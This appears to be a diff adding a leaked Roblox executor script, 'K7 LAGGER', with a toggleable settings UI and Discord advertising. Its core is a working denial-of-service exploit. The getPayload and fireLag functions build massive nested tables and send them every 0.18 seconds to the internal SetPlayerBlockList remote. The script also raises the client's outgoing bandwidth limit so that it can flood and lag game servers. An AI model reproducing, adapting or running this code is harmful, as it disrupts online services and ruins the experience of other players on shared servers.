@@ -1,0 +1,556 @@
+-- leak by FS discord.gg/TBBAUZu8cW
+
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local CoreGui = game:GetService("CoreGui")
+local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+local localPlayer = Players.LocalPlayer
+
+local CONFIG_FILE = "K7Config.json"
+local DEFAULT_KEY = Enum.KeyCode.M
+
+local LAG_LEVELS = {
+    Low = { power = 40 },
+    Insane = { power = 100 }
+}
+
+local currentKeybind = DEFAULT_KEY
+local isBindingKey = false
+local isLaggerEnabled = false
+local currentLevel = "Low"
+local isWindowLocked = false
+local isMobileMode = false
+
+local UI_THEME = {
+    MainBg = Color3.fromRGB(13, 13, 16),
+    TitleColor = Color3.fromRGB(255, 255, 255),
+    TextColor = Color3.fromRGB(236, 236, 242),
+    Font = Enum.Font.GothamBold,
+    GlowColor = Color3.fromRGB(152, 154, 164),
+    TrackOff = Color3.fromRGB(70, 70, 76),
+    TrackOn = Color3.fromRGB(236, 236, 242),
+    BallOff = Color3.fromRGB(152, 154, 164),
+    BallOn = Color3.fromRGB(13, 13, 16),
+    BtnInact = Color3.fromRGB(30, 30, 36),
+    BtnAct = Color3.fromRGB(236, 236, 242),
+    BtnTxtInact = Color3.fromRGB(152, 154, 164),
+    BtnTxtAct = Color3.fromRGB(13, 13, 16),
+    KeyBg = Color3.fromRGB(30, 30, 36),
+    KeyTxt = Color3.fromRGB(236, 236, 242),
+    RowBg = Color3.fromRGB(18, 18, 22),
+}
+
+local function saveConfig()
+    pcall(function()
+        writefile(CONFIG_FILE, HttpService:JSONEncode({
+            Keybind = currentKeybind.Name,
+            Level = currentLevel,
+            Locked = isWindowLocked,
+            Mobile = isMobileMode,
+        }))
+    end)
+end
+
+local function loadConfig()
+    pcall(function()
+        if isfile and isfile(CONFIG_FILE) then
+            local data = HttpService:JSONDecode(readfile(CONFIG_FILE))
+            currentKeybind = Enum.KeyCode[data.Keybind] or DEFAULT_KEY
+            currentLevel = data.Level or "Low"
+            isWindowLocked = data.Locked or false
+            isMobileMode = data.Mobile or false
+        end
+    end)
+end
+loadConfig()
+
+local payloadCache = {}
+local function getPayload(power)
+    if payloadCache[power] then return payloadCache[power] end
+    local chain = {}
+    local last = chain
+    for _ = 1, 25 do
+        local t = {}
+        table.insert(last, t)
+        last = t
+    end
+    local max = math.min(12000, power * 50)
+    local main = {}
+    for _ = 1, max do table.insert(main, chain) end
+    payloadCache[power] = main
+    return main
+end
+
+local lagThread = nil
+local function fireLag(power)
+    pcall(function()
+        game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(getPayload(power))
+    end)
+end
+
+if CoreGui:FindFirstChild("K7LaggerUI") then CoreGui.K7LaggerUI:Destroy() end
+if CoreGui:FindFirstChild("K7Notification") then CoreGui.K7Notification:Destroy() end
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "K7LaggerUI"
+screenGui.Parent = CoreGui
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+screenGui.ResetOnSpawn = false
+
+local notifGui = Instance.new("ScreenGui")
+notifGui.Name = "K7Notification"
+notifGui.Parent = CoreGui
+notifGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+notifGui.ResetOnSpawn = false
+
+local notifFrame = Instance.new("Frame", notifGui)
+notifFrame.Size = UDim2.new(0, 280, 0, 40)
+notifFrame.Position = UDim2.new(0.5, -140, 1, 0)
+notifFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+notifFrame.BackgroundTransparency = 0.85
+notifFrame.BorderSizePixel = 0
+Instance.new("UICorner", notifFrame).CornerRadius = UDim.new(0, 8)
+
+local notifText = Instance.new("TextLabel", notifFrame)
+notifText.Size = UDim2.new(1, 0, 1, 0)
+notifText.BackgroundTransparency = 1
+notifText.Text = "made by printed owner"
+notifText.TextColor3 = Color3.fromRGB(255, 255, 255)
+notifText.Font = Enum.Font.GothamBold
+notifText.TextSize = 14
+notifText.TextXAlignment = Enum.TextXAlignment.Center
+notifText.TextYAlignment = Enum.TextYAlignment.Center
+
+task.spawn(function()
+    task.wait(0.5)
+    TweenService:Create(notifFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+        Position = UDim2.new(0.5, -140, 1, -55)
+    }):Play()
+    task.wait(4)
+    TweenService:Create(notifFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
+        Position = UDim2.new(0.5, -140, 1, 0)
+    }):Play()
+    task.wait(0.6)
+    notifGui:Destroy()
+end)
+
+local PANEL_WIDTH = 270
+local PANEL_HEIGHT_PC = 158
+local PANEL_HEIGHT_MOBILE = 160
+
+local mainFrame = Instance.new("Frame")
+mainFrame.Name = "MainFrame"
+mainFrame.BackgroundColor3 = UI_THEME.MainBg
+mainFrame.BorderSizePixel = 2
+mainFrame.BorderColor3 = UI_THEME.GlowColor
+mainFrame.Size = UDim2.new(0, PANEL_WIDTH, 0, isMobileMode and PANEL_HEIGHT_MOBILE or PANEL_HEIGHT_PC)
+mainFrame.Position = UDim2.new(0.15, 0, 0.5, -((isMobileMode and PANEL_HEIGHT_MOBILE or PANEL_HEIGHT_PC) / 2))
+mainFrame.Parent = screenGui
+mainFrame.ClipsDescendants = true
+Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 12)
+
+local bgImage = Instance.new("ImageLabel", mainFrame)
+bgImage.Image = "rbxassetid://104070936675306"
+bgImage.Size = UDim2.new(1, 0, 1, 0)
+bgImage.BackgroundTransparency = 1
+bgImage.ZIndex = 0
+Instance.new("UICorner", bgImage).CornerRadius = UDim.new(0, 12)
+
+local titleBar = Instance.new("Frame", mainFrame)
+titleBar.BackgroundTransparency = 1
+titleBar.Size = UDim2.new(1, 0, 0, 30)
+titleBar.ZIndex = 5
+
+local titleLabel = Instance.new("TextLabel", titleBar)
+titleLabel.BackgroundTransparency = 1
+titleLabel.Position = UDim2.new(0, 10, 0, 0)
+titleLabel.Size = UDim2.new(0.55, 0, 1, 0)
+titleLabel.Font = Enum.Font.GothamBlack
+titleLabel.Text = "K7 LAGGER"
+titleLabel.TextColor3 = UI_THEME.TitleColor
+titleLabel.TextSize = 16
+titleLabel.TextXAlignment = Enum.TextXAlignment.Left
+titleLabel.TextYAlignment = Enum.TextYAlignment.Center
+titleLabel.ZIndex = 6
+
+local modePillW = 68
+local modePillH = 22
+local modePill = Instance.new("Frame", titleBar)
+modePill.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
+modePill.Size = UDim2.new(0, modePillW, 0, modePillH)
+modePill.Position = UDim2.new(1, -(modePillW + 8), 0.5, -modePillH / 2)
+modePill.BorderSizePixel = 0
+modePill.ZIndex = 6
+Instance.new("UICorner", modePill).CornerRadius = UDim.new(0, 6)
+local modePillStroke = Instance.new("UIStroke", modePill)
+modePillStroke.Color = Color3.fromRGB(55, 55, 60)
+modePillStroke.Thickness = 1
+
+local modeHighlight = Instance.new("Frame", modePill)
+modeHighlight.Size = UDim2.new(0.5, -2, 1, -4)
+modeHighlight.Position = isMobileMode and UDim2.new(0.5, 1, 0, 2) or UDim2.new(0, 1, 0, 2)
+modeHighlight.BackgroundColor3 = Color3.fromRGB(55, 55, 62)
+modeHighlight.BorderSizePixel = 0
+modeHighlight.ZIndex = 7
+Instance.new("UICorner", modeHighlight).CornerRadius = UDim.new(0, 5)
+
+local pcLabel = Instance.new("TextLabel", modePill)
+pcLabel.Size = UDim2.new(0.5, 0, 1, 0)
+pcLabel.Position = UDim2.new(0, 0, 0, 0)
+pcLabel.BackgroundTransparency = 1
+pcLabel.Text = "PC"
+pcLabel.Font = Enum.Font.GothamBold
+pcLabel.TextSize = 10
+pcLabel.TextColor3 = isMobileMode and Color3.fromRGB(90, 90, 95) or Color3.fromRGB(210, 210, 215)
+pcLabel.ZIndex = 8
+
+local mobLabel = Instance.new("TextLabel", modePill)
+mobLabel.Size = UDim2.new(0.5, 0, 1, 0)
+mobLabel.Position = UDim2.new(0.5, 0, 0, 0)
+mobLabel.BackgroundTransparency = 1
+mobLabel.Text = "MOB"
+mobLabel.Font = Enum.Font.GothamBold
+mobLabel.TextSize = 10
+mobLabel.TextColor3 = isMobileMode and Color3.fromRGB(210, 210, 215) or Color3.fromRGB(90, 90, 95)
+mobLabel.ZIndex = 8
+
+local pcClick = Instance.new("TextButton", modePill)
+pcClick.Size = UDim2.new(0.5, 0, 1, 0)
+pcClick.BackgroundTransparency = 1
+pcClick.Text = ""
+pcClick.ZIndex = 9
+
+local mobClick = Instance.new("TextButton", modePill)
+mobClick.Size = UDim2.new(0.5, 0, 1, 0)
+mobClick.Position = UDim2.new(0.5, 0, 0, 0)
+mobClick.BackgroundTransparency = 1
+mobClick.Text = ""
+mobClick.ZIndex = 9
+
+local lockButton = Instance.new("TextButton", titleBar)
+lockButton.BackgroundTransparency = 1
+lockButton.Position = UDim2.new(1, -(modePillW + 8 + 28), 0.5, -11)
+lockButton.Size = UDim2.new(0, 22, 0, 22)
+lockButton.Font = UI_THEME.Font
+lockButton.TextSize = 15
+lockButton.TextColor3 = isWindowLocked and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(120, 120, 125)
+lockButton.AutoButtonColor = false
+lockButton.ZIndex = 6
+lockButton.Text = isWindowLocked and "🔒" or "🔓"
+lockButton.Visible = isMobileMode
+
+lockButton.MouseButton1Click:Connect(function()
+    isWindowLocked = not isWindowLocked
+    lockButton.Text = isWindowLocked and "🔒" or "🔓"
+    lockButton.TextColor3 = isWindowLocked and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(120, 120, 125)
+    saveConfig()
+end)
+
+local isDragging = false
+local dragStart, startPos
+titleBar.InputBegan:Connect(function(inp)
+    if isWindowLocked then return end
+    if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
+        isDragging = true
+        dragStart = inp.Position
+        startPos = mainFrame.Position
+    end
+end)
+UserInputService.InputChanged:Connect(function(inp)
+    if not isDragging or isWindowLocked then return end
+    if inp.UserInputType == Enum.UserInputType.MouseMovement or inp.UserInputType == Enum.UserInputType.Touch then
+        local delta = inp.Position - dragStart
+        mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+end)
+titleBar.InputEnded:Connect(function(inp)
+    if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
+        isDragging = false
+    end
+end)
+
+local content = Instance.new("Frame", mainFrame)
+content.Size = UDim2.new(1, 0, 1, -30)
+content.Position = UDim2.new(0, 0, 0, 30)
+content.BackgroundTransparency = 1
+content.ZIndex = 2
+
+local pcContainer = Instance.new("Frame", content)
+pcContainer.Size = UDim2.new(1, 0, 1, 0)
+pcContainer.BackgroundTransparency = 1
+pcContainer.Visible = not isMobileMode
+
+local ROW_H = 30
+local ROW_PAD_X = 10
+local ROW_Y1 = 4
+local TRACK_W, TRACK_H, BALL_S = 50, 24, 18
+
+local pcTrack = Instance.new("Frame", pcContainer)
+pcTrack.Size = UDim2.new(0, TRACK_W, 0, TRACK_H)
+pcTrack.Position = UDim2.new(1, -(TRACK_W + ROW_PAD_X), 0, ROW_Y1 + (ROW_H - TRACK_H) / 2)
+pcTrack.BackgroundColor3 = UI_THEME.TrackOff
+pcTrack.BorderSizePixel = 0
+pcTrack.ZIndex = 3
+Instance.new("UICorner", pcTrack).CornerRadius = UDim.new(1, 0)
+
+local pcBall = Instance.new("Frame", pcTrack)
+pcBall.Size = UDim2.new(0, BALL_S, 0, BALL_S)
+pcBall.Position = UDim2.new(0, 3, 0.5, -BALL_S / 2)
+pcBall.BackgroundColor3 = UI_THEME.BallOff
+pcBall.BorderSizePixel = 0
+pcBall.ZIndex = 4
+Instance.new("UICorner", pcBall).CornerRadius = UDim.new(1, 0)
+
+local pcToggleClick = Instance.new("TextButton", pcTrack)
+pcToggleClick.Size = UDim2.new(1, 0, 1, 0)
+pcToggleClick.BackgroundTransparency = 1
+pcToggleClick.Text = ""
+
+local pcSwitches = {}
+local SW_TRACK_W, SW_TRACK_H, SW_BALL_S = 38, 18, 13
+local function makePCSwitch(yPos, labelText, modeName, displayValue)
+    local rowBg = Instance.new("Frame", pcContainer)
+    rowBg.Size = UDim2.new(1, -ROW_PAD_X * 2, 0, ROW_H)
+    rowBg.Position = UDim2.new(0, ROW_PAD_X, 0, yPos)
+    rowBg.BackgroundColor3 = UI_THEME.RowBg
+    rowBg.BackgroundTransparency = 0.2
+    rowBg.BorderSizePixel = 0
+    rowBg.ZIndex = 3
+    Instance.new("UICorner", rowBg).CornerRadius = UDim.new(0, 6)
+
+    local lbl = Instance.new("TextLabel", rowBg)
+    lbl.Size = UDim2.new(0.65, 0, 1, 0)
+    lbl.Position = UDim2.new(0, 8, 0, 0)
+    lbl.BackgroundTransparency = 1
+    lbl.Text = labelText
+    lbl.TextColor3 = UI_THEME.TextColor
+    lbl.Font = UI_THEME.Font
+    lbl.TextSize = 11
+
+    local valueBox = Instance.new("TextLabel", rowBg)
+    valueBox.Size = UDim2.new(0, 55, 0, 26)
+    valueBox.Position = UDim2.new(1, -62, 0.5, -13)
+    valueBox.BackgroundColor3 = UI_THEME.KeyBg
+    valueBox.BorderSizePixel = 0
+    valueBox.Text = tostring(displayValue)
+    valueBox.TextColor3 = UI_THEME.KeyTxt
+    valueBox.Font = UI_THEME.Font
+    valueBox.TextSize = 11
+    valueBox.ZIndex = 4
+    Instance.new("UICorner", valueBox).CornerRadius = UDim.new(0, 6)
+    local valueStroke = Instance.new("UIStroke", valueBox)
+    valueStroke.Color = Color3.fromRGB(55, 55, 60)
+    valueStroke.Thickness = 1
+
+    local track = Instance.new("Frame", rowBg)
+    track.Size = UDim2.new(0, SW_TRACK_W, 0, SW_TRACK_H)
+    track.Position = UDim2.new(1, -(SW_TRACK_W + 8), 0.5, -SW_TRACK_H / 2)
+    track.BackgroundColor3 = UI_THEME.TrackOff
+    track.Visible = false
+    track.ZIndex = 4
+    Instance.new("UICorner", track).CornerRadius = UDim.new(1, 0)
+
+    local ball = Instance.new("Frame", track)
+    ball.Size = UDim2.new(0, SW_BALL_S, 0, SW_BALL_S)
+    ball.Position = UDim2.new(0, 2, 0.5, -SW_BALL_S / 2)
+    ball.BackgroundColor3 = UI_THEME.BallOff
+    ball.ZIndex = 5
+    Instance.new("UICorner", ball).CornerRadius = UDim.new(1, 0)
+
+    local swClick = Instance.new("TextButton", rowBg)
+    swClick.Size = UDim2.new(1, 0, 1, 0)
+    swClick.BackgroundTransparency = 1
+    swClick.Text = ""
+
+    local function refresh()
+        local on = (currentLevel == modeName)
+        TweenService:Create(track, TweenInfo.new(0.18), { BackgroundColor3 = on and UI_THEME.TrackOn or UI_THEME.TrackOff }):Play()
+        TweenService:Create(ball, TweenInfo.new(0.18, Enum.EasingStyle.Back), {
+            Position = on and UDim2.new(1, -(SW_BALL_S + 2), 0.5, -SW_BALL_S / 2) or UDim2.new(0, 2, 0.5, -SW_BALL_S / 2),
+            BackgroundColor3 = on and UI_THEME.BallOn or UI_THEME.BallOff
+        }):Play()
+    end
+    swClick.MouseButton1Click:Connect(function()
+        if currentLevel == modeName then return end
+        currentLevel = modeName
+        for _, sw in ipairs(pcSwitches) do sw.refresh() end
+        saveConfig()
+    end)
+    local entry = { refresh = refresh }
+    table.insert(pcSwitches, entry)
+    refresh()
+    return entry
+end
+
+makePCSwitch(ROW_Y1 + ROW_H + 4, "LOW", "Low", 1)
+makePCSwitch(ROW_Y1 + ROW_H + 4 + ROW_H + 2, "INSANE", "Insane", 2)
+
+local keybindChip = Instance.new("TextButton", pcContainer)
+keybindChip.BackgroundColor3 = UI_THEME.KeyBg
+keybindChip.Position = UDim2.new(0, ROW_PAD_X + 75, 0, ROW_Y1 + ROW_H + 4 + ROW_H + 2 + ROW_H + 4)
+keybindChip.Size = UDim2.new(0, 55, 0, 20)
+keybindChip.Font = UI_THEME.Font
+keybindChip.Text = currentKeybind.Name:gsub("Button", "")
+keybindChip.TextColor3 = UI_THEME.KeyTxt
+keybindChip.AutoButtonColor = false
+keybindChip.ZIndex = 3
+Instance.new("UICorner", keybindChip).CornerRadius = UDim.new(0, 4)
+Instance.new("UIStroke", keybindChip).Color = Color3.fromRGB(55, 55, 60)
+
+keybindChip.MouseButton1Click:Connect(function()
+    if isBindingKey then return end
+    isBindingKey = true
+    keybindChip.Text = "..."
+    keybindChip.BackgroundColor3 = UI_THEME.GlowColor
+end)
+
+UserInputService.InputBegan:Connect(function(inp, gp)
+    if not isBindingKey then return end
+    if gp then return end
+    if inp.KeyCode ~= Enum.KeyCode.Unknown then
+        currentKeybind = inp.KeyCode
+        keybindChip.Text = currentKeybind.Name:gsub("Button", "")
+        keybindChip.BackgroundColor3 = UI_THEME.KeyBg
+        isBindingKey = false
+        saveConfig()
+    end
+end)
+
+local mobileContainer = Instance.new("Frame", content)
+mobileContainer.Size = UDim2.new(1, 0, 1, 0)
+mobileContainer.BackgroundTransparency = 1
+mobileContainer.Visible = isMobileMode
+
+local MOB_BTN_W = (PANEL_WIDTH - ROW_PAD_X * 2 - 8) / 2
+local mobBtns = {}
+local function makeMobileBoxBtn(xPos, labelText, subText, modeName)
+    local frame = Instance.new("Frame", mobileContainer)
+    frame.Size = UDim2.new(0, MOB_BTN_W, 0, 62)
+    frame.Position = UDim2.new(0, xPos, 0, 8)
+    frame.BackgroundColor3 = UI_THEME.BtnInact
+    frame.BorderSizePixel = 0
+    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 8)
+    local stroke = Instance.new("UIStroke", frame)
+    stroke.Color = Color3.fromRGB(50, 50, 55)
+
+    local lbl = Instance.new("TextLabel", frame)
+    lbl.Size = UDim2.new(1, 0, 0.55, 0)
+    lbl.Text = labelText
+    lbl.TextColor3 = UI_THEME.BtnTxtInact
+    lbl.Font = Enum.Font.GothamBlack
+    
+    local clk = Instance.new("TextButton", frame)
+    clk.Size = UDim2.new(1, 0, 1, 0)
+    clk.BackgroundTransparency = 1
+    clk.Text = ""
+
+    local function refresh()
+        local on = (currentLevel == modeName)
+        TweenService:Create(frame, TweenInfo.new(0.15), { BackgroundColor3 = on and UI_THEME.BtnAct or UI_THEME.BtnInact }):Play()
+        TweenService:Create(lbl, TweenInfo.new(0.15), { TextColor3 = on and UI_THEME.BtnTxtAct or UI_THEME.BtnTxtInact }):Play()
+    end
+    clk.MouseButton1Click:Connect(function()
+        if currentLevel == modeName then return end
+        currentLevel = modeName
+        for _, b in ipairs(mobBtns) do b.refresh() end
+        saveConfig()
+    end)
+    local entry = { refresh = refresh }
+    table.insert(mobBtns, entry)
+    refresh()
+    return entry
+end
+
+makeMobileBoxBtn(ROW_PAD_X, "LOW", "Mode 1", "Low")
+makeMobileBoxBtn(ROW_PAD_X + MOB_BTN_W + 8, "INSANE", "Mode 2", "Insane")
+
+local function updateLaggerState(active)
+    if active then
+        if lagThread then task.cancel(lagThread) end
+        lagThread = task.spawn(function()
+            while isLaggerEnabled do
+                pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(80000) end)
+                fireLag(LAG_LEVELS[currentLevel].power)
+                task.wait(0.18)
+            end
+        end)
+    else
+        if lagThread then task.cancel(lagThread); lagThread = nil end
+    end
+end
+
+local function setToggleVisual(on)
+    local targetBallX = on and UDim2.new(1, -(BALL_S + 3), 0.5, -BALL_S / 2) or UDim2.new(0, 3, 0.5, -BALL_S / 2)
+    TweenService:Create(pcBall, TweenInfo.new(0.2, Enum.EasingStyle.Back), { Position = targetBallX, BackgroundColor3 = on and UI_THEME.BallOn or UI_THEME.BallOff }):Play()
+    TweenService:Create(pcTrack, TweenInfo.new(0.2), { BackgroundColor3 = on and UI_THEME.TrackOn or UI_THEME.TrackOff }):Play()
+end
+
+local function toggleLagger()
+    isLaggerEnabled = not isLaggerEnabled
+    setToggleVisual(isLaggerEnabled)
+    updateLaggerState(isLaggerEnabled)
+end
+
+pcToggleClick.MouseButton1Click:Connect(toggleLagger)
+
+local function setModeHighlight(mobile)
+    TweenService:Create(modeHighlight, TweenInfo.new(0.2), { Position = mobile and UDim2.new(0.5, 1, 0, 2) or UDim2.new(0, 1, 0, 2) }):Play()
+    TweenService:Create(pcLabel, TweenInfo.new(0.15), { TextColor3 = mobile and Color3.fromRGB(90, 90, 95) or Color3.fromRGB(210, 210, 215) }):Play()
+    TweenService:Create(mobLabel, TweenInfo.new(0.15), { TextColor3 = mobile and Color3.fromRGB(210, 210, 215) or Color3.fromRGB(90, 90, 95) }):Play()
+end
+
+local function refreshLayout()
+    local targetH = isMobileMode and PANEL_HEIGHT_MOBILE or PANEL_HEIGHT_PC
+    TweenService:Create(mainFrame, TweenInfo.new(0.28, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), { Size = UDim2.new(0, PANEL_WIDTH, 0, targetH) }):Play()
+    mainFrame.Position = UDim2.new(0.15, 0, 0.5, -targetH / 2)
+    pcContainer.Visible = not isMobileMode
+    mobileContainer.Visible = isMobileMode
+    lockButton.Visible = isMobileMode
+    setModeHighlight(isMobileMode)
+end
+
+pcClick.MouseButton1Click:Connect(function()
+    if not isMobileMode then return end
+    isMobileMode = false
+    saveConfig(); refreshLayout()
+end)
+mobClick.MouseButton1Click:Connect(function()
+    if isMobileMode then return end
+    isMobileMode = true
+    saveConfig(); refreshLayout()
+end)
+
+UserInputService.InputBegan:Connect(function(inp, gp)
+    if gp or isBindingKey then return end
+    if inp.KeyCode == currentKeybind then toggleLagger() end
+end)
+
+local function spawnDiscordTag(char)
+    local head = char and char:FindFirstChild("Head")
+    if not head then return end
+    local old = head:FindFirstChild("K7DiscordBB")
+    if old then old:Destroy() end
+    local bb = Instance.new("BillboardGui", head)
+    bb.Name = "K7DiscordBB"
+    bb.Size = UDim2.new(0, 200, 0, 30)
+    bb.StudsOffset = Vector3.new(0, 3.2, 0)
+    bb.AlwaysOnTop = true
+    local lbl = Instance.new("TextLabel", bb)
+    lbl.Size = UDim2.new(1, 0, 1, 0)
+    lbl.BackgroundTransparency = 1
+    lbl.Text = "discord.gg/k7hub"
+    lbl.Font = Enum.Font.GothamBold
+    lbl.TextSize = 14
+    lbl.TextStrokeTransparency = 0.5
+    local hue = 0
+    RunService.Heartbeat:Connect(function(dt)
+        hue = (hue + dt * 0.18) % 1
+        lbl.TextColor3 = Color3.fromHSV(hue, 0.55, 0.92)
+    end)
+end
+
+local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
+task.spawn(function() spawnDiscordTag(character) end)
+localPlayer.CharacterAdded:Connect(function(c) task.wait(0.5); spawnDiscordTag(c) end)
